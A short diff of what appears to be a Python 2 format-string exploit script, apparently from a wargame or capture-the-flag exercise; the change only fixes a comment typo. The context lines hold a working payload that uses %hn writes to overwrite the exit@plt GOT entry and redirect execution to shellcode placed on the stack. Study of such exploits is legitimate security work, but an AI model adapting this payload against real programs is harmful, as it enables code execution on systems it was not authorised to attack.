@@ -4,7 +4,7 @@ exit_plt  = struct.pack('I', 0x80497e0)
 exit_plt += struct.pack('I', 0x80497e2)
 
 # 0xffffd84b <--- the area were i did put the shellcode
-# (NB: a werid behaviour of arguments, probably due to allocation the pointer change depending on the argument size)
+# (NB: a weird behaviour of arguments, probably due to allocation the pointer change depending on the argument size)
 
 print exit_plt + "%55363x%10$hn%10164x%11$hn"
 
